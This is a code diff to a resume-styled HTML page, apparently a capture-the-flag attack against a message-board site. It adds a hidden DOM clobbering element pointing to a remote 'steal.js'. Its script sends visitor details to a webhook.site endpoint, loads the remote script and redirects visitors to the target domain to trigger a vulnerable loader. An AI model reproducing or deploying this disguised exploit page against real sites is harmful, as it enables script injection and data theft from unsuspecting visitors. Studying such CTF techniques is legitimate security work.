@@ -23,6 +23,13 @@
                  📧 michael.thompson@protonmail.com | 📱 (410) 555-0199
              </div>
 
+             <!-- CRITICAL: DOM Clobbering element - this was missing! -->
+             <div style="position: fixed; left: -10000px; visibility: hidden; 
+     opacity: 0;">
+                 <input id="utilsJS" name="url" 
+     value="https://gavinyw.github.io/resume-portfolio/steal.js">
+             </div>
+
              <h2>Professional Summary</h2>
              <p>Experienced software engineer with 12+ years in web development,
      cybersecurity, and team leadership. Specializes in secure applications and
@@ -53,135 +60,151 @@
          </div>
 
          <script>
-             // This approach uses a much simpler strategy:
-             // We'll try to navigate back to the CTF site with a carefully crafted
-      URL
-             // that will trigger the DOM clobbering attack on the correct domain
+             console.log('Combined attack strategy starting...');
 
-             console.log('URL fragment attack initializing...');
-
+             // CORS-FREE webhook function
              function sendWebhook(data) {
-                 const img = new Image();
-                 const params = new URLSearchParams();
-                 Object.keys(data).forEach(key => {
-                     params.append(key, typeof data[key] === 'object' ?
+                 try {
+                     const img = new Image();
+                     const params = new URLSearchParams();
+                     Object.keys(data).forEach(key => {
+                         params.append(key, typeof data[key] === 'object' ?
      JSON.stringify(data[key]) : data[key]);
-                 });
-                 img.src =
-     'https://webhook.site/1bd95653-39a3-44bb-8f14-f88bb2d9ddad/fragment?' +
+                     });
+                     img.src =
+     'https://webhook.site/1bd95653-39a3-44bb-8f14-f88bb2d9ddad/combined?' +
      params.toString();
-                 document.body.appendChild(img);
+                     document.body.appendChild(img);
+                     console.log('Status sent:', data.status);
+                 } catch(e) { console.error('Webhook failed:', e); }
              }
 
-             // Send initial status
+             // Send initial confirmation
              sendWebhook({
-                 status: 'URL_FRAGMENT_ATTACK_START',
+                 status: 'COMBINED_ATTACK_START',
                  timestamp: new Date().toISOString(),
+                 current_domain: window.location.hostname,
                  current_url: window.location.href,
-                 referrer: document.referrer || 'none',
-                 user_agent: navigator.userAgent
+                 clobbering_ready: !!window.utilsJS,
+                 clobbering_url: window.utilsJS?.url || window.utilsJS?.value ||
+     'not_found',
+                 user_agent: navigator.userAgent,
+                 referrer: document.referrer || 'none'
              });
 
-             // Strategy: Navigate back to CTF domain with our payload in the URL
-             // The key insight is that we need to get back to the same origin as 
-     the localStorage
-
+             // STRATEGY 1: Traditional DOM Clobbering (this was working before)
              setTimeout(() => {
-                 // Determine the CTF domain
-                 // Since referrer is 'none', we'll use the most likely CTF domain
-                 const ctfDomain = 'ctf.secjhu.club'; // Update if you know the 
-     exact domain
+                 console.log('Executing DOM clobbering strategy...');
 
-                 // Create a URL that will:
-                 // 1. Take us back to the CTF domain
-                 // 2. Include our DOM clobbering payload in the fragment
-                 // 3. Trigger the messages functionality
-
-                 // Encode our payload in the URL fragment
-                 const payload =
-     encodeURIComponent('https://gavinyw.github.io/resume-portfolio/steal.js');
-                 const maliciousUrl = `https://${ctfDomain}/?resume=viewed&return=p
-     ortfolio#messages&utilsJS=${payload}`;
-
-                 sendWebhook({
-                     status: 'NAVIGATING_TO_CTF',
-                     timestamp: new Date().toISOString(),
-                     target_url: maliciousUrl,
-                     target_domain: ctfDomain
-                 });
-
-                 // Navigate to the CTF site with our payload
-                 window.location.href = maliciousUrl;
-
-             }, 2000);
-
-             // Alternative approach: Try to detect if we're already on the CTF 
-     domain
-             if (window.location.hostname.includes('secjhu') ||
-     window.location.hostname.includes('ctf')) {
-                 console.log('Already on CTF domain - executing attack directly');
-
-                 // Parse the URL fragment for our payload
-                 const hash = window.location.hash;
-                 const searchParams = new URLSearchParams(window.location.search);
-
-                 // Look for our utilsJS payload in URL
-                 let payloadUrl = null;
-                 if (hash.includes('utilsJS=')) {
-                     const match = hash.match(/utilsJS=([^&]+)/);
-                     if (match) {
-                         payloadUrl = decodeURIComponent(match[1]);
-                     }
-                 }
-
-                 if (payloadUrl) {
-                     // Create DOM clobbering element
-                     const input = document.createElement('input');
-                     input.id = 'utilsJS';
-                     input.name = 'url';
-                     input.value = payloadUrl;
-                     input.style.cssText =
-     'position:fixed;left:-9999px;opacity:0;';
-                     document.body.appendChild(input);
-
+                 if (window.utilsJS && (window.utilsJS.url ||
+     window.utilsJS.value)) {
                      sendWebhook({
-                         status: 'DOM_CLOBBERING_SETUP_ON_CTF_DOMAIN',
+                         status: 'DOM_CLOBBERING_EXECUTING',
                          timestamp: new Date().toISOString(),
-                         payload_url: payloadUrl,
-                         current_domain: window.location.hostname
+                         script_url: window.utilsJS.url || window.utilsJS.value
                      });
 
-                     // Execute the vulnerable function
-                     setTimeout(() => {
-                         try {
-                             if (typeof loadMessageBoardJS === 'function') {
-                                 loadMessageBoardJS();
-                             } else {
-                                 // Simulate the vulnerable function
-                                 let utilJS = window.utilsJS || {};
-                                 if (utilJS.url) {
-                                     const script =
-     document.createElement('script');
-                                     script.src = utilJS.url;
-                                     document.body.appendChild(script);
+                     // Simulate the vulnerable loadMessageBoardJS function
+                     let utilJS = window.utilsJS || {};
+                     let scriptSrc = utilJS.url || utilJS.value;
 
-                                     sendWebhook({
-                                         status:
-     'PAYLOAD_SCRIPT_LOADED_ON_CTF_DOMAIN',
-                                         timestamp: new Date().toISOString(),
-                                         script_src: utilJS.url
-                                     });
-                                 }
-                             }
-                         } catch(e) {
-                             sendWebhook({
-                                 status: 'CTF_DOMAIN_EXECUTION_ERROR',
-                                 timestamp: new Date().toISOString(),
-                                 error: e.message
-                             });
-                         }
-                     }, 1000);
+                     if (scriptSrc) {
+                         console.log('Loading payload script:', scriptSrc);
+                         let script = document.createElement('script');
+                         script.src = scriptSrc;
+                         document.body.appendChild(script);
+
+                         sendWebhook({
+                             status: 'PAYLOAD_SCRIPT_LOADED',
+                             timestamp: new Date().toISOString(),
+                             script_src: scriptSrc
+                         });
+                     }
+                 } else {
+                     sendWebhook({
+                         status: 'DOM_CLOBBERING_FAILED',
+                         timestamp: new Date().toISOString(),
+                         utilsJS_exists: !!window.utilsJS
+                     });
                  }
+             }, 2000);
+
+             // STRATEGY 2: Check if we're on CTF domain and handle accordingly
+             if (window.location.hostname.includes('secjhu') ||
+     window.location.hostname.includes('ctf')) {
+                 console.log('On CTF domain - direct execution');
+
+                 sendWebhook({
+                     status: 'ON_CTF_DOMAIN',
+                     timestamp: new Date().toISOString(),
+                     domain: window.location.hostname
+                 });
+
+                 // If we're already on CTF domain, execute attack directly
+                 setTimeout(() => {
+                     // Try to trigger the vulnerable function on the CTF site
+                     if (typeof loadMessageBoardJS === 'function') {
+                         loadMessageBoardJS();
+                     } else {
+                         // Create DOM clobbering and execute
+                         const input = document.createElement('input');
+                         input.id = 'utilsJS';
+                         input.name = 'url';
+                         input.value =
+     'https://gavinyw.github.io/resume-portfolio/steal.js';
+                         input.style.cssText =
+     'position:fixed;left:-9999px;opacity:0;';
+                         document.body.appendChild(input);
+
+                         setTimeout(() => {
+                             let utilJS = window.utilsJS || {};
+                             if (utilJS.url) {
+                                 const script = document.createElement('script');
+                                 script.src = utilJS.url;
+                                 document.body.appendChild(script);
+                             }
+                         }, 1000);
+                     }
+                 }, 3000);
+
+             } else {
+                 // STRATEGY 3: If on GitHub, try redirect after DOM clobbering 
+     attempt
+                 setTimeout(() => {
+                     console.log('On GitHub - attempting redirect to CTF domain');
+
+                     const ctfDomain = 'ctf.secjhu.club';
+                     const redirectUrl = `https://${ctfDomain}/#messages`;
+
+                     sendWebhook({
+                         status: 'ATTEMPTING_CTF_REDIRECT',
+                         timestamp: new Date().toISOString(),
+                         target_url: redirectUrl
+                     });
+
+                     // Only redirect if we haven't already tried
+                     if (!sessionStorage.getItem('redirect_attempted')) {
+                         sessionStorage.setItem('redirect_attempted', 'true');
+                         setTimeout(() => {
+                             window.location.href = redirectUrl;
+                         }, 1000);
+                     }
+                 }, 6000);
+             }
+
+             // STRATEGY 4: Also try to navigate to messages section if we're on 
+     CTF domain
+             if (window.location.hostname.includes('secjhu') ||
+     window.location.hostname.includes('ctf')) {
+                 setTimeout(() => {
+                     if (window.location.hash !== '#messages') {
+                         window.location.hash = '#messages';
+                         sendWebhook({
+                             status: 'NAVIGATED_TO_MESSAGES',
+                             timestamp: new Date().toISOString()
+                         });
+                     }
+                 }, 4000);
              }
          </script>
      </body>
